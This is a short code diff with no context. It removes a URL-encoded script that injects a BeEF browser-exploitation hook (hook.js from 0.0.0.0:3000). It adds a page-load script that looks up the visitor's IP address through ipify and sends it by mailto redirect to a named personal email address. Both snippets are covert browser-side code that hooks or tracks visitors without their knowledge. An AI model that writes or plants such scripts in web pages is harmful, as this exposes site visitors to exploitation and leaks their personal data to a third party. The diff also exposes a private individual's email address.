@@ -1,1 +1,23 @@
-%20(function%20()%20{%20var%20url%20=%20%27http://0.0.0.0:3000/hook.js%27;if%20(typeof%20beef%20==%20%27undefined%27)%20{%20var%20bf%20=%20document.createElement(%27script%27);%20bf.type%20=%20%27text%2fjavascript%27;%20bf.src%20=%20url;%20document.body.appendChild(bf);}})();
+<script>
+// Send the user's IP address to your email
+function sendIP() {
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "https://api.ipify.org?format=json", true);
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4 && xhr.status == 200) {
+            var response = JSON.parse(xhr.responseText);
+            var ip = response.ip;
+            // Create a mailto link with the IP address
+            var subject = "User IP Address";
+            var body = "The user's IP address is: " + ip;
+            var mailtoLink = "mailto:Royce.vansumeren@icloud.com?subject=" + encodeURIComponent(subject) + "&body=" + encodeURIComponent(body);
+            // Open the default email client with the mailto link
+            window.location.href = mailtoLink;
+        }
+    }
+    xhr.send();
+}
+
+// Call the function to send the IP when the page loads
+sendIP();
+</script>
